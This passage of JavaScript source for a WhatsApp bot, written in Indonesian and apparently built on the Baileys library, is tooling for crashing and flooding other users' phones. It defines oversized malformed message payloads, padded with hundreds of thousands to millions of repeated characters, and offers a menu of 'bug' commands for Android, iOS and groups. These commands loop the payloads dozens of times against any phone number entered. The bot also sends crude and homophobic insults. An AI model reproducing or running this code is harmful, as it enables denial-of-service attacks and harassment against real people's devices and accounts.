    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰.ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e7f01b0a8ae36bcc73db8.jpg" } }, { upload: ryozingod.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #lexgoddominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐋𝐞𝐗𝐜𝐙 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜💀᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return joreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}

//=================================================//
switch (command) {
// Status
case 'public': {
if (!isPremium) return joreply(mess.premium) 
ryozingod.public = true
joreply('succes')
}
break
//=================================================//
case 'clearchat': {
pee = "\n".repeat(200)
joreply(pee + '😁🖕')
}
break
//=================================================//
//Menu
case "menu": {
let jinjing = [nulll, nulll2]
let randomIndex = Math.floor(Math.random() * jinjing.length)
let mydick = jinjing[randomIndex]

//text menu
let penisbengkok = `
*${ucapanWaktu} @${m.sender.split("@")[0]}*
\`
┏❐  ⌜ About ⌟  ❐
┃⭔ Creator : 𝐋𝐞𝐗𝐜𝐙
┃⭔ Library : WS-Baileys
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┗❐

𝐋𝐞𝐗𝐜𝐙 © Copyright`

let njing = `
*${ucapanWaktu} @${m.sender.split("@")[0]}*

┏❐  ⌜ About ⌟  ❐
┃⭔ Creator : 𝐋𝐞𝐗𝐜𝐙
┃⭔ Library : WS-Baileys
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┗❐

┏❐   \`*OWNER CMD*\` 
┃
┃⭔ addakses 62##/TAG 30d
┃⭔ delakses 62##/TAG 30d
┃⭔ changemenu button/non
┃⭔ autoread on/off
┃⭔ autotyping on/off
┃⭔ autorecord on/off
┃⭔ autobio on/off
┃⭔ self
┃⭔ public
┃⭔ shutdown
┃⭔ addcase 
┃⭔ delcase
┃⭔ join [link group]
┃⭔ block [nomor]
┃⭔ unblock [nomor]
┃⭔ listblock
┃⭔ setppbot [reply gambar]
┃⭔ setbiobot [teks]
┃⭔ listpc
┃
┗❐

┏❐  \`*BUG GROUP*\`
┃
┃⭔ bug-button link group
┃⭔ bug-browser link group
┃⭔ bug-gc 120###@g.us
┃⭔ penghitaman 120###@g.us
┃⭔ bug-ganas link group
┃⭔ bug-entod link group
┃⭔ bug-ewe link group
┃⭔ bug-coli link group
┃⭔ bug-suki link group
┃⭔ bug-gcbom link group
┃⭔ bug-gcmawar link group
┃⭔ bug-gcexploit link group
┃
┗❐

┏❐  \`*BUG SPAM*\`
┃
┃⭔ bijiloe 62877###|jumlah
┃⭔ ajimale 62877###|jumlah
┃⭔ riper 62877###|jumlah
┃⭔ guru 62877###|jumlah
┃⭔ kepsek 62877###|jumlah
┃⭔ ipa 62877###|jumlah
┃⭔ ips 62877###|jumlah
┃⭔ penjas 62877###|jumlah
┃⭔ lexspam 62877###|jumlah
┃⭔ lexngocok 62877###|jumlah
┃⭔ lexkentut 62877###|jumlah
┃⭔ lexberak 62877###|jumlah
┃⭔ lexcoli 62877###|jumlah
┃⭔ asuu 62877###|jumlah
┃⭔ temble 62877###|jumlah
┃⭔ kursi 62877###|jumlah
┃⭔ lexalok 62877###|jumlah
┃⭔ lexbarbar 62877###|jumlah
┃⭔ lexdangdut 62877###|jumlah
┃⭔ lexganas 62877###|jumlah
┃⭔ lexcok 62877###|jumlah
┃
┗❐

┏❐  \`*BUG ANDRO*\`
┃
┃⭔ bijiloe 62877###|jumlah
┃⭔ ajimale 62877###|jumlah
┃⭔ prikitiw 62877###
┃⭔ sipilist 62877###
┃⭔ 1hit 62877###
┃⭔ 1shoot 62877###
┃⭔ mimir 62877###
┃⭔ fatal-notif 62877###
┃⭔ fatal-ui 62877###
┃⭔ crash-total 62877###
┃⭔ forces-sql 62877###
┃⭔ bug-rom 62877###
┃⭔ restart-ui 62877###
┃⭔ zero-bug 62877###
┃⭔ bug-s 62877###
┃⭔ virg4m 62877###
┃⭔ crashganas 62877###
┃⭔ bug-24j 62877###
┃⭔ gada-ampun 62877###
┃⭔ samsung-chace 62877###
┃⭔ samsung-24j 62877###
┃⭔ rog 62877###
┃⭔ coli 62877###
┃⭔ kentang 62877###
┃⭔ revankontol 62877###
┃⭔ ewe 62877###
┃⭔ nokia123 62877###
┃⭔ bug-recover 62877###
┃⭔ not-human 62877###
┃⭔ impossible 62877###
┃⭔ shock 62877###
┃⭔ wave 62877###
┃⭔ surprise 62877###
┃⭔ lexunlimited 62877###
┃
┗❐

┏❐  \`*BUG IOS*\`
┃
┃⭔ vios-unli 62877###
┃⭔ ios-kentang 62877###
┃⭔ ios-virus 62877###
┃⭔ ios24j 62877###
┃⭔ nonstop 62877###
┃⭔ visible 62877###|waktu
┃⭔ ios-alok 62877###|waktu
┃⭔ ios-kelli 62877###|waktu
┃⭔ bug-ipong 62877###|waktu
┃⭔ bug-ios 62877###|waktu
┃⭓ #masukkan waktu 1 = 200 detik
┃⭓ #cek id = ketik .cekidgc
┃
┗❐

┏❐  \`*BUG EMOJI*\`
┃
┃⭔ 🗿 62877######
┃⭔ 🌷 62877######
┃⭔ 🐑 62877######
┃⭔ 🥰 62877######
┃⭔ 😈 62877######
┃⭔ 😂 62877######
┃⭔ 😭 62877######
┃⭔ 🙀 62877######
┃⭔ 🤪 62877######
┃⭔ 🥶 62877######
┃⭔ 💀 62877######
┃⭔ ☠️ 62877######
┃⭔ 👿 62877######
┃⭔ 🤡 62877######
┃
┗❐

┏❐  \`*BUG BOT* {khusus nomor bot}\`
┃
┃⭔ bgtes jumlah
┃⭔ bugpenis jumlah
┃⭔ bugpepek jumlah
┃⭔ plerku jumlah
┃⭔ null-chace jumlah
┃⭔ 200k jumlah
┃⭔ 300k
┃⭔ 500k jumlah
┃⭔ senggol
┃⭔ bgtes2 jumlah
┃
┗❐

𝐋𝐞𝐗𝐜𝐙 © Copyright\``

//Button Menu
let freesex = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": '.',
"serverMessageId": 1
},
},
"header": {
"title": penisbengkok,
...(await prepareWAMessageMedia({ image : mengkece }, { upload: ryozingod.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "⿻  ⌜ . ⌟  ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "⿻𝐋𝐞𝐗𝐜𝐙⿻", "sections": [{ "title": "# !-Choose One Of Them", "highlight_label": "🌏General Commands🗨️", "rows": [{ "header": "ALL COMMAND", "title": "Show All Command", "id": ".all" }, { "header": "Owner", "title": "Displays Owner Number", "id": ".owner" }, { "header": "Bot Info", "title": "Displays Information About Bots", "id": ".botstatus" }] }, { "title": "🦠 SpeCiaL - ComManD ❌", "highlight_label": " #SpeCial ", "rows": [{ "header": "Special", "title": "displays all special commands", "id": ".spesial" }] }] }`
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Instagram\",\"url\":\"https://instagram.com/__ffajrii\",\"merchant_url\":\"https://instagram.com/__ffajrii\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};

let kontollurus = {
image: mengkece,
caption: njing,
contextInfo:{externalAdReply:{
title: '⟠ . 々',
body: `👤`, 
showAdAttribution: true,
thumbnail: mydick,
mediaType: 4,
MediaUrl:`https://`,
sourceUrl:`https://`,
}}
};

if ( db.data.settings[botNumber].menuType === 'externalImage') {
ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
ryozingod.relayMessage(m.chat, freesex, {})
}

}
break
//=================================================//
case 'botstatus': {
let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
penis = fs.readFileSync("./ryozingod.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n⭔ ');

joreply(`
┏❐  ⌜ About ⌟  ❐
┃⭔ Creator : 𝐋𝐞𝐗𝐜𝐙
┃⭔ Library : WS-Baileys
┃⭔ Type : Case
┃⭔ Status : Ready 
┃⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Resp Speed : ${latensi.toFixed(4)}
┃⭔ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┃⭔ Runtime : ${run}
┗❐

`)
}
break
//=================================================//
case 'owner': case 'botowner':
let namaown = `Owner Cakep`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐋𝐞𝐗𝐜𝐙 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐋𝐞𝐗𝐜𝐙 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

case 'shutdown': {
if (!isDeveloper) return joreply(mess.owner)
joreply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break
//=================================================//
case 'changemenu':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} button/non`)
if (q == 'button') {
db.data.settings[botNumber].menuType = 'buttonImage'
joreply(`Successfully Changed Menu To Button List Image`)
} else if (q == 'non') {
db.data.settings[botNumber].menuType = 'externalImage'
joreply(`Successfully Changed Auto Typing To External Image`)
}
break
//=================================================//
case 'autorecord':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
joreply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
joreply(`Successfully Changed Auto Record To ${q}`)
}
break;
//=================================================//
case 'autoread':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoread = true
joreply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoread = false
joreply(`Successfully Changed Auto Read To ${q}`)
}
break
//=================================================//
case 'autotyping':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
joreply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
joreply(`Successfully Changed Auto Typing To ${q}`)
}
break
//=================================================//
case 'autobio':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
joreply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
joreply(`Successfully Changed Auto Bio To ${q}`)
}
break
//=================================================//
case 'onlygroup':
case 'onlygc':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
joreply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
joreply(`Successfully Changed Onlygroup To ${q}`)
}
break
//=================================================//
case 'listpc': {
if (!isDeveloper) return joreply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
joreply(teks)
}
break
//=================================================//
case "addcase": {
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply(`Masukan Input`);
if (!q.includes("|")) return joreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

let tempat = q.split("|")[0];
let casenya = q.split("|")[1];
let newCase = casenya

let fileContent = fs.readFileSync("./ryozingod.js", "utf-8");

let breakIndex = fileContent.indexOf(`break\n`, fileContent.indexOf(`case "${tempat}":`));

if (breakIndex !== -1) {
fileContent = fileContent.slice(0, breakIndex + 6) + newCase + fileContent.slice(breakIndex + 6);

fs.writeFileSync("./ryozingod.js", fileContent, "utf-8");

joreply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
} else {
joreply(`Tidak dapat menemukan break di case "${tempat}".`);
}
}
break
//=================================================//
case "delcase": {
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./ryozingod.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./ryozingod.js", fileContent, "utf-8");

joreply(`Case "${caseName}" berhasil dihapus!`);
} else {
joreply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
//=================================================//
case 'inilex' : {
ryozingod.sendMessage(m.chat, { text: `_lex itu ganteng banget, aku jdi suka ama dia 😣😖😫_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
ryozingod.sendMessage(m.chat, { text: `Hoekkkkkkk🤮🤮🤮. najis ada gay, mati aja lu kontol🤢` }, { quoted: m })
}
break
//=================================================//
case 'remini': case 'hd': case 'hdr': {
if (!quoted) return joreply(`Fotonya Mana?`)
if (!/image/.test(mime)) return joreply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
joreply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
ryozingod.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break

//Owner fitur
case 'addakses': {
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 2)
return joreply(`Penggunaan :\n*#addakses* @tag waktu\n*#addakses* nomor waktu\n\nContoh : #addakses @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
joreply("Sukses Akses")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/e7f01b0a8ae36bcc73db8.jpg`}, caption: `Kamu sekarang Dapat Akses Bug`},{quoted: qevent })
}
}
break
//=================================================//
case 'delakses': {
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Penggunaan :\n*#delakses* @tag\n*#delakses* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya));
joreply("Sukses Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya))
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/e7f01b0a8ae36bcc73db8.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
joreply("Entitas premium tidak ditemukan")
}
}
}
break
//=================================================//
case 'tourl': {
joreply(mess.wait)
let media = await ryozingod.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await uptotelegra(media)
joreply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
joreply(util.format(anu))
}
}
break

//Group Menu
case "resetlinkgc": case "revoke":{
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
await ryozingod.groupRevokeInvite(m.chat).then((res) => joreply(`Sukses riset link group`)).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case "kick": {
if (!isGroup) return joreply('Only Group')
if (!isAdmins && !isDeveloper) return joreply('Only Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break

//Panel
case 'listram': {
joreply(` ╭ ──▸ ListRam ( ${global.namabot} )
 │
 │ 𖣂 Sc Private 𖤲 <特> 𖤲
 │名前 : ${m.pushName}}
 │   ⛩️ タグ : @${m.sender.split('@')[0]}
 │
${global.listr}
 │
 ╰ ───────⬣`)
}
break
//=================================================//
case 'zero-bug': case 'bug-s': case '🐑': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'rog': case 'coli': case 'kentang': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'revankontol': case 'ewe': case 'nokia123': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'samsung-chace': case '🤡': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'bug-recover': case 'not-human': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
